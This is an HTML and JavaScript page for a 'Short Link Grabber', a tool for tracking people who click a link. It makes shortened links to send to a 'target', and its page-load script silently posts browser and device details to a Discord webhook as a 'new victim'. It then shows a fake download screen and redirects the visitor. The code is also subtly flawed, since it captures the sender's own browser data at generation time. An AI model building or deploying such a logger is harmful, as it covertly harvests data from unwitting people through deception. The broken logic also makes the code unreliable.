<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Short Link Grabber</title>
    <style>
        body {
            font-family: system-ui, sans-serif;
            background: #0d1117;
            color: #c9d1d9;
            margin: 0;
            padding: 40px 20px;
            min-height: 100vh;
        }
        .container {
            max-width: 620px;
            margin: 0 auto;
            background: #161b22;
            padding: 32px;
            border-radius: 12px;
            border: 1px solid #30363d;
        }
        h1 {
            color: #58a6ff;
            text-align: center;
            margin-bottom: 24px;
        }
        label {
            display: block;
            margin: 0 0 8px;
            font-weight: 500;
        }
        input[type="text"] {
            width: 100%;
            padding: 12px 16px;
            background: #0d1117;
            border: 1px solid #30363d;
            border-radius: 6px;
            color: white;
            font-size: 16px;
            margin-bottom: 20px;
        }
        button {
            width: 100%;
            padding: 14px;
            background: #238636;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 17px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.2s;
        }
        button:hover {
            background: #2ea043;
        }
        #result {
            margin-top: 30px;
            padding: 16px;
            background: #0d1117;
            border: 1px solid #30363d;
            border-radius: 6px;
            display: none;
        }
        #shortLink {
            color: #79c0ff;
            word-break: break-all;
            font-family: monospace;
            font-size: 1.1em;
            margin: 12px 0;
        }
        .note {
            color: #8b949e;
            font-size: 0.92em;
            text-align: center;
            margin-top: 24px;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>Short Link Generator</h1>
        
        <label for="webhook">Your Discord/Webhook URL:</label>
        <input type="text" id="webhook" placeholder="https://discord.com/api/webhooks/..." autocomplete="off">
        
        <button onclick="generateShortLink()">Generate Short Link</button>
        
        <div id="result">
            <strong>Copy & send this short link:</strong>
            <div id="shortLink"></div>
            <div class="note">Data is collected & sent **only** when someone opens this link</div>
        </div>
    </div>

    <script>
        async function generateShortLink() {
            const webhook = document.getElementById("webhook").value.trim();
            
            if (!webhook || !webhook.startsWith("http")) {
                alert("Please enter a valid webhook URL (http/https)!");
                return;
            }

            // Minimal info template (will be stringified later when victim opens)
            const infoTemplate = {
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language || navigator.userLanguage,
                screen: `${screen.width}×${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };

            // The REAL long URL that contains the data & webhook
            const longUrl = `${window.location.href.split('?')[0]}?data=${encodeURIComponent(JSON.stringify(infoTemplate))}&wh=${encodeURIComponent(webhook)}`;

            try {
                // Call free shrtco.de API (no key needed!)
                const response = await fetch(`https://api.shrtco.de/v2/shorten?url=${encodeURIComponent(longUrl)}`);
                const data = await response.json();

                if (data.ok && data.result?.short_link) {
                    const shortUrl = data.result.short_link;

                    document.getElementById("shortLink").textContent = shortUrl;
                    document.getElementById("result").style.display = "block";

                    // Try auto-copy
                    try {
                        await navigator.clipboard.writeText(shortUrl);
                        alert("Short link copied to clipboard!\nSend it to your target.");
                    } catch {
                        alert("Short link generated!\nCopy manually:\n\n" + shortUrl);
                    }
                } else {
                    alert("Failed to shorten URL.\nTry again or check your internet.");
                }
            } catch (err) {
                alert("Error connecting to shortener API.\nYou can still use the full URL manually.");
            }
        }

        // ── VICTIM SIDE ── When short link is opened
        window.addEventListener("load", async () => {
            const params = new URLSearchParams(window.location.search);
            const dataStr = params.get("data");
            const webhook = params.get("wh");

            if (dataStr && webhook) {
                try {
                    const info = JSON.parse(decodeURIComponent(dataStr));

                    // Send to webhook
                    await fetch(decodeURIComponent(webhook), {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({
                            content: "**New victim clicked!**",
                            embeds: [{
                                title: "Grabbed Info",
                                color: 3447003, // blue
                                timestamp: info.timestamp,
                                fields: [
                                    { name: "Time", value: new Date().toLocaleString(), inline: true },
                                    { name: "User-Agent", value: "```" + (info.userAgent || "—").substring(0, 300) + "```" },
                                    { name: "Platform", value: info.platform || "unknown", inline: true },
                                    { name: "Screen", value: info.screen || "—"},
                                    { name: "Language", value: info.language || "—"},
                                    { name: "Timezone", value: info.timezone || "—"}
                                ],
                                footer: { text: "Basic logger • " + window.location.host }
                            }]
                        })
                    }).catch(() => {}); // silent

                    // Fake download screen
                    document.body.innerHTML = `
                        <div style="text-align:center; padding:140px 20px; color:#58a6ff;">
                            <h1 style="font-size:3em;">Downloading file...</h1>
                            <p style="color:#8b949e; font-size:1.4em; margin:30px 0;">
                                Please wait, your download will start automatically...
                            </p>
                            <p style="color:#444; font-size:0.95em;">
                                If nothing happens → <a href="#" onclick="location.reload()">refresh</a>
                            </p>
                        </div>
                    `;

                    // Fake delay + redirect to something harmless
                    setTimeout(() => {
                        window.location = "https://files.catbox.moe/fake-example.zip"; // ← change to real fake file if you want
                    }, 2800);

                } catch (e) {
                    document.body.innerHTML = "<h1 style='text-align:center;padding:140px;'>Error - Invalid link</h1>";
                }
            }
        });
    </script>
</body>
</html>
